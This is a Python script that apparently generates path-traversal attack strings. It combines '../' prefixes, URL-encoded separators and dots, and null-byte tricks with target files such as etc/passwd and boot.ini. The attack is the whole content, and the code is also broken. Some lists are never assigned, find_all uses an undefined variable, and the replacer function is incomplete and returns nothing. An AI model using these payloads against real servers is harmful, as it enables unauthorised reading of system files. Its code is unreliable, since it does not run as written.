# Base
base = [
"../",
"./",
".\\\\./",
""
]

# / replacement
"/"
""
"///"
"//"
"%25%5c"
"%5c"
"\\"
"\\\\"


# . replacement
""
"."
"%2e"
"%%32%65%"

# Beginning of the line
beginning = [
"/%00/",
"/%2500/",
"/&apos;/",
"/"
]

# End of line
end = [
"",
"%00",
"#",
"^^"
]

# Extensions
"html"

# file
linux_files = [
"etc/passwd",
"etc/hosts"
]

windows_files = [
"boot.ini",
"C://boot.ini"
]

# bypass -> Beginning of line + bypass -> x + file -> x + eol -> replacement


import itertools

# Define the characters and the maximum length
characters = ['a', 'b', 'c']
max_length = 3

def iterator(passed_list: list=[], max_length: int=1, return_type: str = "string") -> list:
    return_arr = []
    for length in range(1, max_length + 1):
        for combination in itertools.product(passed_list, repeat=length):
            return_arr.append(''.join(combination))
    return return_arr

def combiner(first: list=[], second: list=[]) -> list:
    return_arr = []
    for item1 in first:
        for item2 in second:
            return_arr.append(item1 + item2)
    return return_arr

def find_all(full_string: str = "", substring: str=""):
    start = 0
    while True:
        start = full_string.find(substring, start)
        if start == -1: return
        yield start
        start += len(sub) 

def replacer(full_string_arr: list=[], 
            replaced_char: str = "", 
            replacing_arr: list = []) -> list:
    return_arr = []
    for full_string in full_string_arr:
        all_occurrances = find_all(full_string, replaced_char)
        all_occurrances_combination = []
        for combination in itertools.product(all_occurrances):
            for replacing_combo in itertools.product(replacing_arr, 
                                    repeat=len(list(combination))):
            

                for index_replace in list(combination):
                    full_string_temp = full_string
                    for replacing_char in replacing_arr:
                        full_string_temp[index_replace] = replacing_char


    return return_arr



iter1 = (iterator(base, 4))
begin_bypass = combiner(beginning, iter1)
begin_bypass_file = combiner(begin_bypass, linux_files)
begin_bypass_file_end = combiner(begin_bypass_file, end)

print(iter1, len(iter1))
print(iterator(characters, max_length, "list"))

